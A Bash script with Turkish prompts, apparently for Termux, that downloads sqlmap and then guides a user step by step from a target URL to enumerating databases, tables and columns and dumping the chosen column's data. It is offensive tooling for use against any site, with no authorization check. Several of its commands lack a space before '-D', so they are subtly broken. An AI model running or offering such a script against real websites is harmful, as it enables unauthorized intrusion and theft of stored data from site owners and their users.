#!/bin/bash
kontrol=$(ls |grep -w sqlmap |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m SQLMAP İNDİRİLİYOR.."
	echo
	echo
	echo
	git clone https://github.com/sqlmapproject/sqlmap.git
fi
kontrol=$(which python |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m PYTHON PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install python -y
fi
clear
bash banner.sh
echo
echo
echo
cd sqlmap
history -r link.txt
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mLİNKİ GİRİNİZ\e[31m ]───────►  \e[0m' link
history -s $link
echo "$link" >> link.txt
echo
echo
echo
echo -e "\e[31mGİRİLEN LİNK >> \e[0mpython sqlmap.py -u \e[32m"$link"\e[0m --dbs\e[0m"
echo
echo
echo
python sqlmap.py -u "$link" --dbs
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mDATABASE ADINI GİRİNİZ\e[31m ]───────►  \e[0m' databasead
echo
echo
echo
echo -e "\e[31mGİRİLEN DATABASE ADI >> \e[0mpython sqlmap.py -u "$link" -D \e[32m$databasead\e[0m --tables\e[0m"
echo
echo
echo
python sqlmap.py -u "$link" -D $databasead --tables
echo
echo
echo
read -e -p $' \e[32m TABLO ADINI GİRİNİZ \e[31m>>\e[0m\n\n ' tabload
echo
echo
echo
echo -e "\e[31mGİRİLEN TABLO ADI >> \e[0mpython sqlmap.py -u "$link"-D $databasead -T \e[32m$tabload\e[0m --columns\e[0m"
echo
echo
echo
python sqlmap.py -u "$link"-D $databasead -T $tabload --columns
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mKOLON ADINI GİRİNİZ\e[31m ]───────►  \e[0m' kolonad
echo
echo
echo
echo -e "\e[31mGİRİLEN KOLON ADI >> \e[0mpython sqlmap.py -u "$link"-D $databasead -T $tabload -C\e[32m $kolonad\e[0m --dump\e[0m"
echo
echo
echo
python sqlmap.py -u "$link"-D $databasead -T $tabload -C $kolonad --dump
echo
echo
echo
